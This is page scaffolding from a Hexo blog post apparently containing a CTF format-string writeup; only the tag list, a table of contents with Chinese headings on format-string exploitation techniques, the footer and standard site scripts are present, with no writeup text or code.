	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li> <li><a href="/tags/fmt/">fmt<span>7</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A5%97orw"><span class="toc-article-text">非栈上格式化字符串套orw</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3%E4%B8%AA%E5%AD%97%E8%8A%82%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2libc"><span class="toc-article-text">3个字节格式化字符串泄露libc</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#musl-libc%E4%B8%AD%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%92%8C%E7%A6%81%E7%94%A8-%E5%B7%AE%E4%B8%8D%E5%A4%9A"><span class="toc-article-text">musl libc中的格式化字符串 (和禁用$差不多)</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
